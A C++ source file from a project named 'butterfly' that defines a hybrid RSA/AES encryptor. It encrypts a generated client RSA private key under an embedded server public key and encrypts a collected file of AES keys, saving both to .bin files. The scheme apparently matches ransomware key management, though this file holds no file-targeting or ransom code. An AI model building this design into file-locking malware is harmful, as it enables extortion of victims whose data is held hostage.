
#include "crypto/encryptor.h"

namespace butterfly
{

namespace hybrid
{

Encryptor::Encryptor(int keySize) : _keySize(keySize), _rsaEncryptorAESKey(new rsa::RSAEncryptor(_keySize)),
                                                       _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
                                                       _aesEncryptor(new aes::AESEncryptor())
{

}

Encryptor::~Encryptor()
{

}

void Encryptor::encryptCPrivateRSA()
{

    std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();
    EVP_PKEY *cPrivateRSAPKey = _rsaEncryptorCPrivateRSA->getEvpPkey();

    try
    {
        // encrypt the CPrivateRSA.pem string
        _rsaEncryptorCPrivateRSA->encrypt(cPrivateRSAPKey, cPrivateRSAStr.substr(0, cPrivateRSAStr.size() - 1));
        // get the encrypted CPrivateRSA string
        std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedKey();
        // save the encrypted CPrivateRSA string to CPrivateRSA.bin
        _rsaEncryptorCPrivateRSA->saveEncryptedKeyFile(CPRIVATERSA_FILENAME, cPrivateRSAEnc,_rsaEncryptorCPrivateRSA->getEvpPkeySize(cPrivateRSAPKey));

    } catch (RSAEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }

}

void Encryptor::encryptAESKeyFile(const std::string &filepath)
{

    std::string fileContent = butterfly::readBinFile(filepath);

    try
    {
        // encrypt the collection of the AES keys
        _rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), fileContent);
        // get the encrypted AES Keys collection string
        std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedKey();
        // save the encrypted AES Keys to AESKey.bin
        _rsaEncryptorAESKey->saveEncryptedKeyFile(AES_KEY_ENC_FILENAME, aesKeyEnc,_rsaEncryptorAESKey->getRSAKeySize());

    } catch (RSAEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }

}

} // namespace hybrid

} // namespace butterfly
